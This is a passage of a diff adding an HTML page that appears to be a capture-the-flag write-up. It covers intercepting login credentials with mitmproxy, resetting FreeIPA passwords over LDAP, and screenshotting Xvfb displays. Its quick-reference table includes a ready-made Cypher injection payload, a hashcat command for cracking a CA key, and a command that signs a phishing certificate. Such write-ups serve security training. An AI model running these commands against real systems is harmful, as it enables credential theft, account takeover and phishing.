+</code></pre>
+<p>The <code>--ssl-insecure</code> flag tells mitmproxy not to verify the upstream certificate. The addon script captures POST body content from login forms.</p>
+<hr>
+<h3>FreeIPA / LDAP Password Reset via Delegated Roles</h3>
+<p>FreeIPA&#39;s role-based access control can grant non-admin users the ability to modify specific LDAP attributes on specific user accounts. The <code>ldapmodify</code> tool with <code>userPassword</code> attribute replacement is the standard mechanism for password resets outside the IPA CLI:</p>
+<pre><code class="language-bash">ldapmodify -x -H ldap://localhost \
+  -D &quot;uid=&lt;privileged_user&gt;,cn=users,cn=accounts,dc=domain,dc=com&quot; \
+  -w &lt;password&gt; -f modify.ldif
+</code></pre>
+<p>Where <code>modify.ldif</code> contains the <code>changetype: modify / replace: userPassword</code> operation. This bypasses the need to know the current password of the target account.</p>
+<hr>
+<h3>Xvfb Framebuffer Credential Extraction</h3>
+<p>X Virtual Framebuffer runs a headless X server. If a process (like Mousepad or a browser) renders sensitive data in an Xvfb display, any user who can write to <code>/tmp/.X11-unix/X&lt;DISPLAY&gt;</code> or read from the SHM framebuffer can take a screenshot:</p>
+<pre><code class="language-bash"># Screenshot with xwd
+DISPLAY=:&lt;N&gt; xwd -root -silent -out /tmp/dump.xwd
+
+# Convert with ImageMagick
+convert /tmp/dump.xwd /tmp/screen.png
+
+# Or with xwud (display directly, requires local X)
+xwud -in /tmp/dump.xwd
+</code></pre>
+<hr>
+<h3>Quick Reference</h3>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Clone repo (skip TLS verify)</td>
+<td><code>GIT_SSL_NO_VERIFY=1 git clone https://...</code></td>
+</tr>
+<tr>
+<td>Cypher injection (registration key)</td>
+<td><code>/dashboard/store/x%22%20%7D%29%20RETURN%20result%20UNION%20ALL%20MATCH%20%28c%3A%20Config%29%20RETURN%20%7B%20id%3A%20%22c%22%2C%20name%3A%20c.registration_key%2C%20description%3A%20%22x%22%2C%20is_authorized%3A%20true%2C%20created_by_id%3A%20%22x%22%20%7D%20AS%20result%20%2F%2F</code></td>
+</tr>
+<tr>
+<td>Crack encrypted PEM key</td>
+<td><code>pem2john RootCA.key &gt; h.hash &amp;&amp; hashcat -m 22921 h.hash rockyou.txt</code></td>
+</tr>
+<tr>
+<td>Issue TLS cert from CA</td>
+<td><code>openssl x509 -req -in phish.csr -CA RootCA.crt -CAkey RootCA.key -passin pass:&lt;P&gt; -CAcreateserial -out phish.crt -days 365</code></td>
+</tr>
+<tr>
+<td>Capture Xvfb framebuffer</td>
+<td><code>DISPLAY=:99 xwd -root -out /tmp/s.xwd &amp;&amp; convert /tmp/s.xwd /tmp/s.png</code></td>
+</tr>
+<tr>
+<td>Docker Registry catalog</td>
+<td><code>curl -u user:pass http://localhost:5000/v2/_catalog</code></td>
+</tr>
+<tr>
+<td>FreeIPA LDAP password reset</td>
+<td><code>ldapmodify -x -H ldap://localhost -D &quot;uid=&lt;u&gt;,cn=users,cn=accounts,dc=...&quot; -w &lt;p&gt;</code></td>
+</tr>
+<tr>
+<td>pspy monitor (no root)</td>
+<td><code>./pspy64</code></td>
+</tr>
+</tbody></table>
+<hr>
+  </main>
+
+
+  <!-- ═══════════════════════════════════════════════════════════
+       FOOTER
+       EDIT: brand name, link, and year as needed
+  ═══════════════════════════════════════════════════════════ -->
+  <footer class="cp-footer">
+    <span>© 2026 Motasem Notes</span>
+    <span class="cp-footer-sig">[ SYS.INTEGRITY: OK ]</span>
+    <a href="https://motasem-notes.net" target="_blank">motasem-notes.net</a>
+  </footer>
+
+
+  <!-- Live clock in topbar -->
+  <script>
+    (function () {
+      const el = document.getElementById('cp-clock');
+      if (!el) return;
+      function tick() {
+        const now = new Date();
+        const hh  = String(now.getHours()).padStart(2,'0');
+        const mm  = String(now.getMinutes()).padStart(2,'0');
+        const ss  = String(now.getSeconds()).padStart(2,'0');
+        el.textContent = `SYS://${hh}:${mm}:${ss}`;
+      }
+      tick();
+      setInterval(tick, 1000);
+    })();
+  </script>
+
+</body>
+</html>
